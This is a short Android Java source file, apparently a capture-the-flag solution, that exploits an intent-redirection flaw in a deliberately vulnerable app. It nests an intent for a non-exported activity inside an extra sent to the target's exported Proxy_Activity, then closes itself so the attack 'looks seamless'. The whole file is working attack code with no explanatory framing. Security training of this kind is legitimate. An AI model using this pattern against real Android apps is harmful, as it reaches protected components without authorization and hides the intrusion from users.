package com.example.thirdflag;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Craft the intent to access the non_exported activity
        Intent targetIntent = new Intent();
        targetIntent.setClassName("com.example.intetn_redirect_vuln", "com.example.intetn_redirect_vuln.non_exported");

        // Wrap the target intent in another intent to pass to Proxy_Activity
        Intent exploitIntent = new Intent();
        exploitIntent.setClassName("com.example.intetn_redirect_vuln", "com.example.intetn_redirect_vuln.Proxy_Activity");
        exploitIntent.putExtra("extra_intent", targetIntent);

        // Start the Proxy_Activity
        startActivity(exploitIntent);

        // Close the malicious app to make it look seamless
        finish();
    }
}